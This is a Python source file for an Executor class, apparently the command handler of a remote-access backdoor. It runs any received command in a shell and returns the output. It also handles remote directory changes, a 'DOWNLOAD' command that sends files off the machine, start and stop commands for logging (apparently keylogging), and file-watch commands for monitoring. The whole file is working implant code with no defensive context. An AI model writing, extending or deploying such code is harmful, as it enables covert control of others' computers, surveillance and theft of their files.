import subprocess
import os
from bdfileutils import FileMonitor, FileSender


class Executor(object):
    def __init__(self, listener):
        self.proc = None
        self.working_directory = os.path.dirname(os.path.realpath(__file__))
        self.filemon = FileMonitor()
        self.sender = FileSender()
        self.listener = listener

    def add_watches(self, path_list):
        for path in path_list:
            self.add_watch(path)

    def add_watch(self, path):
        try:
            directory, filename = path.split(' ')
        except ValueError:
            directory = path
            filename = None

        self.filemon.add_watch(directory, filename=filename)

    def upload(self, path):
        self.sender.send_file(path)

    def run(self, command):
        """
        Executes the given command in a shell and returns the command output.
        """
        # special cases
        if command[:3] == 'cd ':
            try:
                os.chdir(os.path.expanduser(command[3:]))
            except OSError as e:
                return None, str(e)

            return None, None

        elif command[:9] == 'DOWNLOAD ':
            if not os.path.exists(command[9:]):
                return None, "File doesn't exist\n"

            self.upload(command[9:])

            return '', None

        elif command[:5] == 'LOGON':
            if self.listener.start_logging():
                return 'Logging started\n', None
            else:
                return None, 'Logging already started\n'

        elif command[:6] == 'LOGOFF':
            if self.listener.stop_logging():
                return 'Logging stopped\n', None

            return None, 'Logging already stopped\n'

        elif command[:6] == 'WATCH ':
            self.add_watch(command[6:])
            return 'Watch added', None

        elif command[:8] == 'RMWATCH ':
            if self.filemon.remove_watch(command[8:]):
                return 'Watch removed\n', None
            return None, 'Watch does not exist\n'

        else:
            self.proc = subprocess.Popen([str(command)], stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, shell=True)
            return self.proc.communicate()
